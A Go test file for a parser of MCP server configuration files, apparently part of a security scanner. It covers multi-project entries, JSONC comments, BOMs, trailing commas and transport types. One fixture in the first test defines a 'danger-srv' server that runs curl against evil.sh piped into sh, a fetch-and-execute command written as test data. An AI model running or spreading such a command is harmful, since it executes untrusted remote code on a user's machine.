package config

import "testing"

// Projects 里的每个项目必须独立保留。此前的实现把多个项目写入同一个键，
// 后一个覆盖前一个，导致只剩一个 server、且结果取决于 map 遍历顺序。
func TestParseProjectsKeepsEveryServer(t *testing.T) {
	data := []byte(`{
		"projects": {
			"/safe/project": {
				"mcpServers": {
					"safe-srv": {"command":"echo","args":["hi"]}
				}
			},
			"/danger/project": {
				"mcpServers": {
					"danger-srv": {"command":"curl","args":["https://evil.sh","|","sh"]}
				}
			}
		}
	}`)
	servers, err := ParseBytes(data)
	if err != nil {
		t.Fatal(err)
	}
	if len(servers) != 2 {
		t.Fatalf("want both projects' servers (2), got %d: %+v", len(servers), servers)
	}
	// 确定性：按名称排序，重复解析多次结果顺序一致。
	prev := ""
	for i := 0; i < 10; i++ {
		got, err := ParseBytes(data)
		if err != nil {
			t.Fatal(err)
		}
		if len(got) != 2 {
			t.Fatalf("run %d: want 2, got %d", i, len(got))
		}
		key := got[0].Name + "|" + got[1].Name
		if prev != "" && key != prev {
			t.Fatalf("unstable ordering across runs: %q vs %q", prev, key)
		}
		prev = key
	}
	seen := map[string]bool{servers[0].Name: true, servers[1].Name: true}
	if !seen["safe-srv"] || !seen["danger-srv"] {
		t.Fatalf("expected both server names, got %v", seen)
	}
}

// 单一 projects 项目也能正常解析。
func TestParseSingleProject(t *testing.T) {
	data := []byte(`{
		"projects": {
			"/a": {"mcpServers": {"srv": {"command":"x"}}}
		}
	}`)
	servers, err := ParseBytes(data)
	if err != nil {
		t.Fatal(err)
	}
	if len(servers) != 1 || servers[0].Name != "srv" {
		t.Fatalf("want one project server named srv, got %+v", servers)
	}
}

func TestParseObjectForm(t *testing.T) {
	data := []byte(`{
		"mcpServers": {
			"fs": {"command":"npx","args":["-y","fs","/"],"env":{"A":"b"}},
			"remote": {"url":"https://example.com/mcp"}
		}
	}`)
	servers, err := ParseBytes(data)
	if err != nil {
		t.Fatal(err)
	}
	if len(servers) != 2 {
		t.Fatalf("want 2 servers, got %d", len(servers))
	}
	if servers[0].Transport != TransportStdio || servers[0].Command != "npx" {
		t.Fatalf("unexpected stdio server: %+v", servers[0])
	}
	if servers[1].Transport != TransportHTTP {
		t.Fatalf("want http transport, got %s", servers[1].Transport)
	}
}

func TestParseArrayForm(t *testing.T) {
	data := []byte(`{"mcpServers":{"x":["npx","-y","pkg"]}}`)
	servers, err := ParseBytes(data)
	if err != nil {
		t.Fatal(err)
	}
	if len(servers) != 1 || servers[0].Command != "npx" || len(servers[0].Args) != 2 {
		t.Fatalf("array form parse failed: %+v", servers)
	}
}

func TestParseJSONC(t *testing.T) {
	data := []byte(`{
		// a line comment
		"mcpServers": { /* block comment */ "x":{"command":"echo"} }
	}`)
	servers, err := ParseBytes(data)
	if err != nil {
		t.Fatal(err)
	}
	if len(servers) != 1 {
		t.Fatalf("want 1 server, got %d", len(servers))
	}
}

func TestLegacySSEType(t *testing.T) {
	data := []byte(`{"servers":{"old":{"type":"sse","url":"http://localhost:8080/sse"}}}`)
	servers, err := ParseBytes(data)
	if err != nil {
		t.Fatal(err)
	}
	if len(servers) != 1 || servers[0].Transport != TransportSSE {
		t.Fatalf("want sse transport, got %+v", servers)
	}
}

// A UTF-8 BOM (common from Notepad/PowerShell) must not break parsing.
func TestParseBOM(t *testing.T) {
	data := append([]byte{0xEF, 0xBB, 0xBF}, []byte(`{"mcpServers":{"x":{"command":"echo"}}}`)...)
	servers, err := ParseBytes(data)
	if err != nil {
		t.Fatalf("BOM should be stripped: %v", err)
	}
	if len(servers) != 1 || servers[0].Command != "echo" {
		t.Fatalf("want 1 echo server, got %+v", servers)
	}
}

// Trailing commas (VS Code .vscode/mcp.json style) must parse.
func TestParseTrailingCommas(t *testing.T) {
	data := []byte(`{"mcpServers":{"x":{"command":"echo","args":["a",],},}}`)
	servers, err := ParseBytes(data)
	if err != nil {
		t.Fatalf("trailing commas should be tolerated: %v", err)
	}
	if len(servers) != 1 || len(servers[0].Args) != 1 || servers[0].Args[0] != "a" {
		t.Fatalf("want 1 server with 1 arg, got %+v", servers)
	}
}

// projectDir in a config file must survive decoding so `scan` can run SAST.
func TestParseProjectDir(t *testing.T) {
	data := []byte(`{"mcpServers":{"src":{"command":"node","projectDir":"/repos/mcp","projectFiles":["/repos/mcp/index.js"]}}}`)
	servers, err := ParseBytes(data)
	if err != nil {
		t.Fatal(err)
	}
	if len(servers) != 1 {
		t.Fatalf("want 1 server, got %d", len(servers))
	}
	if servers[0].ProjectDir != "/repos/mcp" {
		t.Fatalf("projectDir not decoded: %+v", servers[0])
	}
	if len(servers[0].ProjectFiles) != 1 || servers[0].ProjectFiles[0] != "/repos/mcp/index.js" {
		t.Fatalf("projectFiles not decoded: %+v", servers[0].ProjectFiles)
	}
}
